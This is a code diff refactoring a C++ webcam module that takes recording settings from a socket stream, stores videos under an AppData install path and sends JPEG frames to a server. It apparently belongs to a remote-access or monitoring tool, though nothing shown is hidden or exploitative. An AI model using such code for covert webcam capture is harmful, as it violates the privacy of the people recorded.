@@ -1,13 +1,15 @@
 #include "WebcamManager.h"
 
-#include <utility>
-
 
 // constructor -> information of recording and socket
-WebcamManager::WebcamManager(Stream stream, int webcamID, bool fragmented, int FPS,const std::string& locationOfVideos)
-        : stream(stream), webcamID(webcamID), fragmented(fragmented), FPS(FPS), locationOfVideos(std::move(Converter::string2wstring(locationOfVideos))) {
+WebcamManager::WebcamManager(const Stream &stream)
+        : Sender(stream) {
+    std::string webcamName = stream.readString();
+    webcamID = DeviceEnumerator::getIndexOfWebcamByName(webcamName);
+    fragmented = stream.readSize();
+    FPS = stream.readSize();
+    locationOfVideos = Converter::string2wstring(WEBCAM);
     fileName = Install::getAppDataPath() +L"\\" + this->locationOfVideos + L"\\" +( fragmented ? L"fragmented_video_" : L"one_take_video_");
-    std::wcout << fileName << std::endl;
 }
 
 // sending all records available in path vector
@@ -40,7 +42,7 @@ void WebcamManager::sendFrame(const cv::Mat& frame){
     cv::imencode(".jpeg", frame, buff);
     // sending process
     stream.sendSize((int) buff.size());
-    send(stream.getSock(), (char *) &buff[0], (int) buff.size(), 0);
+    ::send(stream.getSock(), (char *) &buff[0], (int) buff.size(), 0);
 }
 
 
@@ -48,6 +50,10 @@ void WebcamManager::sendFrame(const cv::Mat& frame){
 void WebcamManager::sendDimensions(int width,int height){
     stream.sendSize(width);
     stream.sendSize(height);
+}
+
+void WebcamManager::send() {
+
 }
 
 // starting webcam, sending information to server
